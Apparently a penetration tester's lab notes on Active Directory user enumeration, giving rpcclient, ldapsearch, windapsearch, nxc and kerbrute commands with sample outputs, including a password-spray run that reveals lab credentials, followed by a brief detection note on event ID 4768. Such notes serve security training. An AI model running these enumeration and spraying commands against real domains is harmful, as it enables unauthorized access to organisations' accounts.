## Anonymous enumeration:

### valid users (rpc, smb)

```shell-session
$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

$ rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
rpcclient $> querydominfo
rpcclient $> getdompwinfo

$ nxc smb 172.16.5.5 --users
```

clean nxc output:

```
cat users.tmp | awk '{print $5}'
cat users.txt |cut -d '\' -f 2 > users_valid.txt #remove "domain/" part

```

### LDAP

`windaysearch users`

```shell-session
$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

`prepare ldapsearch`

```
ldapsearch -h 172.16.5.5 -x -s base namingcontexts
# LOOK FOR DN
```

![[Pasted image 20250731155800.png]]

#### querying ldap:`

```
$ ldapsearch -h 172.16.5.5 -x -b "DC=BLACKWOOD,DC=LOCAL"  <query> <filters>
```

people

```
ldapsearch -h 172.16.5.5 -x -b "DC=BLACKWOOD,DC=LOCAL" -s sub "(&(objectclass=people))" SamAccountName|grep samAccountName| awk `{print $2}` > userlist.ldap.txt
```

remove guest/machine accounts

```shell-session
$ ldapsearch -h 172.16.5.5 -x -b "DC=BLACKWOOD,DC=LOCAL" -s sub "(&(objectclass=user))"
```

---

## using kerbrute and OSINT info

### from osint:

create list with discovered names, add to vim

create multi format names with username unarchy

```
~/linux/username-unarchy/username-unarchy -i <file>
```

## kerbrute to find valid users

find valid users of user list with kerbrute

```
kerbrute userenum --dc IP --domain DN <file>
```

brute force user list with password list

```
└─$ nxc smb 10.129.202.85 -u namesformats_totest.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success |grep '[+]'
```

EXAMPLE

```
$ nxc smb 10.129.202.85 -u names.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success |grep '[+]'
SMB                      10.129.202.85   445    ILF-DC01         [+] ILF.local\cjohnson:Welcome1212
SMB                      10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

```

- point Kerbrute at the DC we found earlier and feed it a wordlist.

```shell-session
$ kerbrute userenum -d blackwood.local --dc 172.16.5.5 jsmith.txt -o valid_ad_users.txt

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@blackwood.local
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@blackwood.local
```

---

## EXAMPLE TOOL OUTPUTS

`LDAP Anonymous bind abuse`

```
$ ldapsearch -h 172.16.5.5 -x -b "DC=BLACKWOOD,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
DC01$
MS01$
WEB01$
vipa0z
avazquez
pfalcon
<SNIP>
```

we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.

`windapsearch`

```shell-session
$ windapsearch --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=BLACKWOOD,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as:
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users:

cn: Guest

cn: Htb Student
userPrincipalName: vipa0z@blackwood.local

cn: Annie Vazquez
userPrincipalName: avazquez@blackwood.local
<SNIP>
```

`Kerbrute User Enumeration`

```shell-session
$  kerbrute userenum -d blackwood.local --dc 172.16.5.5 /opt/jsmith.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@blackwood.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@blackwood.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@blackwood.local
<SNIP>
```

# mitigation

We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.

ports used by the tools:

| Tool      | Ports                                             |
| --------- | ------------------------------------------------- |
| nmblookup | 137/UDP                                           |
| nbtstat   | 137/UDP                                           |
| net       | 139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535 |
| rpcclient | 135/TCP                                           |
| smbclient | 445/TCP                                           |
